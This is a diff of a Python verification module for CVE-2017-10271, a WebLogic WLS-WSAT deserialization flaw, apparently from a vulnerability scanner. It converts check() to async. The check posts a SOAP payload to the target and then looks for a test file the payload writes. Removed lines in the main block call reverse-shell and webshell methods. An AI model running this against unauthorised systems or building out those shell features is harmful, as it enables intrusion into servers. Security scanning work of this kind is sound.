@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2017_10271_BaseVerify:
     def __init__(self, url):
@@ -21,7 +21,7 @@ class CVE_2017_10271_BaseVerify:
             'Content-Type': 'text/xml'
         }
         
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -50,18 +50,14 @@ class CVE_2017_10271_BaseVerify:
                         <soapenv:Body/>
                         </soapenv:Envelope>
                        '''
-            result = request.post(self.url + "/wls-wsat/CoordinatorPortType", headers = self.headers, data = check_payload)
-            check = request.get(self.url +  '/bea_wls_internal/check.text')
-            if check.status_code == 200 and 'This is a Test' in check.text:
+            await request.post(self.url + "/wls-wsat/CoordinatorPortType", headers = self.headers, data = check_payload)
+            check_req = await request.get(self.url +  '/bea_wls_internal/check.txt')
+            result = await check_req.text()
+            if check_req.status == 200 and 'This is a Test' in result:
                 return True
-            else:
-                return False
-        except Exception as e:
-            return False, e
-        finally:
+        except BaseException as e:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
     CVE_2017_10271 = CVE_2017_10271_BaseVerify('http://127.0.01:7001')
-    print(CVE_2017_10271.reverse('127.0.0.1', '9999'))
-    print(CVE_2017_10271.webshell('test'))
